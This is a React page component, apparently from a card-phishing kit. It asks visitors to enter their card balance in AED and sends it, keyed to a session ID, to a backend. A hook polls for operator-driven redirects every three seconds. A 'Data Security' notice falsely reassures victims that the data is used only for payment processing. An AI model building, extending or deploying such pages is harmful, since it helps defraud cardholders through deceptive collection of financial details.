import React, { useState } from "react";
import styles from "./Balance.module.css";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";

const BalancePage: React.FC = () => {
  useRedirectChecker(3000);
  const [balance, setBalance] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!balance || isNaN(Number(balance)) || Number(balance) <= 0) {
      setError("Пожалуйста, введите корректную сумму баланса");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const sessionId = localStorage.getItem("currentSessionId");

      if (!sessionId) {
        setError("Сессия не найдена");
        setIsLoading(false);
        return;
      }

      const response = await fetch("http://localhost:3123/submit-balance", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId,
          balance: Number(balance),
        }),
      });

      const result = await response.json();

      if (!result.success) {
        // Можно показать сообщение об успехе или перенаправить куда-то
        setError(result.error || "Произошла ошибка при отправке");
        // navigate('/success'); // или куда нужно
      }
    } catch (error) {
      console.error("Error submitting balance:", error);
      setError("Ошибка сети. Попробуйте еще раз.");
    }
  };

  const formatBalance = (value: string) => {
    // Убираем все нечисловые символы кроме точки
    const cleaned = value.replace(/[^\d.]/g, "");

    // Проверяем, что есть только одна точка
    const parts = cleaned.split(".");
    if (parts.length > 2) {
      return parts[0] + "." + parts.slice(1).join("");
    }

    return cleaned;
  };

  const handleBalanceChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatBalance(e.target.value);
    setBalance(formatted);
    setError("");
  };

  return (
    <div className={styles["balance-page"]}>
      <div className={styles["balance-container"]}>
        <div className={styles["balance-header"]}>
          <h1>Checking card balance</h1>
          <p>Please enter your card's current balance to continue.</p>
        </div>

        <form onSubmit={handleSubmit} className={styles["balance-form"]}>
          <div className={styles["input-group"]}>
            <label htmlFor="balance">Card balance</label>
            <div className={styles["input-wrapper"]}>
              <input
                type="text"
                id="balance"
                value={balance}
                onChange={handleBalanceChange}
                placeholder="0.00"
                className={error ? styles["error"] : ""}
                disabled={isLoading}
              />
              <span className={styles["currency"]}>AED</span>
            </div>
            {error && <span className={styles["error-message"]}>{error}</span>}
          </div>

          <button
            type="submit"
            className={`${styles["submit-button"]} ${
              isLoading ? styles["loading"] : ""
            }`}
            disabled={isLoading || !balance}
          >
            {isLoading ? (
              <div className={styles["loading-spinner"]}>
                <div className={styles["spinner"]}></div>
                Processing...
              </div>
            ) : (
              "Submit balance"
            )}
          </button>
        </form>

        <div className={styles["security-notice"]}>
          <div className={styles["security-icon"]}>🔒</div>
          <div className={styles["security-text"]}>
            <strong>Data Security</strong>
            <p>
              Your data is protected and is used only for payment processing.
            </p>
          </div>
        </div>
      </div>
      <Loading isLoading={isLoading} />
    </div>
  );
};

export default BalancePage;
